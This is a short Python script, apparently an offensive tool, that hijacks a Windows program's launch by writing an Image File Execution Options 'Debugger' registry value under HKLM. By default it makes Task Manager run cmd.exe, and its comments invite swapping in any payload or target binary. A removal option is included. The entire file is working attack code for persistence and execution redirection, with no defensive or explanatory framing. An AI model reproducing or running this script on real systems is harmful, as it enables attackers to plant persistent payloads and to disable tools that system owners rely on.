import os
import ctypes
import winreg

def is_admin():
    ####Check if the script is running as Administrator
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def hijack_debugger(target_process, payload_path):
    ###Set a debugger registry key to hijack execution
    try:
        key_path = fr"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{target_process}"
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)

        winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, payload_path)
        winreg.CloseKey(key)

        print(f"[+] Successfully hijacked {target_process} to execute: {payload_path}")

    except Exception as e:
        print(f"[-] Error setting debugger key: {e}")

def remove_hijack(target_process):
    ###Remove the debugger hijack registry key
    try:
        key_path = fr"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{target_process}"
        winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        print(f"[+] Successfully removed hijack for {target_process}")

    except Exception as e:
        print(f"[-] Error removing debugger hijack: {e}")

if __name__ == "__main__":
    if not is_admin():
        print("[-] This script must be run as Administrator.")
    else:
        target = "taskmgr.exe"  # Replace with another system binary if needed
        payload = "C:\\Windows\\System32\\cmd.exe"  # Change to your payload

        choice = input("[1] Hijack Debugger\n[2] Remove Hijack\nSelect: ")

        if choice == "1":
            hijack_debugger(target, payload)
        elif choice == "2":
            remove_hijack(target)
        else:
            print("[-] Invalid option.")
